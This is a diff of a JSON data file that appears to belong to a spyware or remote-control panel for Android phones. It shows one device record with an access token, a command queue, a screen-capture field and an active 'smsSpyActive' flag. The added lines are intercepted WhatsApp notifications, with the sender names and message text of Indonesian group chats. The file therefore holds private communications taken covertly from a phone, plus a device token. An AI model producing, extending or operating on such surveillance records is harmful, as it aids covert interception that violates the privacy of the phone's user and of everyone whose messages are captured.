@@ -2766,7 +2766,7 @@
     "deviceName": "HP-FREE-E7C4",
     "ownerUsername": "rian",
     "token": "3edb01b0f7a259097d52c5b4fdd50348",
-    "lastSeen": 1775201055505,
+    "lastSeen": 1775201064508,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T07:22:21.597Z",
@@ -2782,6 +2782,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗞𝗨𝗪𝗢 𝗫 𝗞𝗜𝗡𝗚 𝗥𝗜𝗖𝗬 #𝟮 (163 pesan): ~ ehann",
+        "content": "22 1,5 nvmtps fpt n mobi n makro andro only",
+        "time": "03/04 14:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201066420
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1420 pesan dari 5 chat",
+        "time": "03/04 14:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201056667
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗞𝗨𝗪𝗢 𝗫 𝗞𝗜𝗡𝗚 𝗥𝗜𝗖𝗬 #𝟭 (8 pesan): ~ vndr",
+        "content": "info rental akun OPM/lumut/riper",
+        "time": "03/04 14:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201056587
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
